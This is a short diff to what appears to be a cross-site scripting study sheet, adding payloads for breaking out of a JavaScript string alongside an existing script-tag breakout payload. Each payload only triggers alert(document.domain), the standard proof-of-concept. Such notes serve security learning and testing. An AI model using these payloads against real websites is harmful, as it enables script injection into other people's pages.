@@ -12,3 +12,6 @@ Cross-site scripting contexts :
     XSS into JavaScript :
         JavaScript string with single quote and backslash escaped :
             </script><img src=1 onerror=alert(document.domain)>
+        Breaking out of a JavaScript string :
+            '-alert(document.domain)-'
+            ';alert(document.domain)//
